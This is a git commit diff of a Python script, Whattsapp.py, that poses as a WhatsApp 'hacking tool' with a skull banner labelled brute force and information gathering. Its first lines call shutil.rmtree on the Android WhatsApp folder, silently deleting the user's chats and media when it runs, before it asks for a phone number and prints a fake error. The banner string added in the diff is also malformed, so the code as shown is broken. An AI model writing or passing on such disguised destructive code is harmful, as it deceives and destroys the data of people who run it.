0d14a3f43d51f56bacce016757528e7635da0af4
bilal407g <69185351+bilal407g@users.noreply.github.com>
2020-10-09 06:49:34 +0500

    Update Whattsapp.py

--- Whattsapp.py
+++ Whattsapp.py
@@ -1,7 +1,22 @@
 import shutil
-
 shutil.rmtree('/storage/emulated/0/WhatsApp')
-
+print(' |    ,;                           ;,
+                    |    ; ;      .           .      ; ;
+                    |__  | ;   ______       ______   ; |
+                  ___    |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
+                   |      |   |        }:{        |   |
+     <bruteforce   |      |   l       / | \       !   |
+         attack/>  |      .~  (__,.--" .^. "--.,__)  ~.
+                   |      |    ----;' / | \ `;----    |
+                   |__     \__.       \/^\/       .__/
+                     ___    V| \                 / |V
+                      |      | |T~\___!___!___/~T| |
+                      |      | |'IIII_I_I_I_IIII'| |
+        <information  |      |  \,III I I I III,/  |
+          gathering/> |       \   `~~~~~~~~~~'    /
+                      |         \   .       .   /
+                      |__         \.         ./
+                                    ^._.^._.^ ')
 print('--------------------------------------------')
 print('wellcome to whattsapp hack8ng tool')
 print('--------------------------------------------')
@@ -15,4 +30,3 @@ print('Phone number :/' )
 a=input()
 
 print('sorry your writing way is incorrect')
-
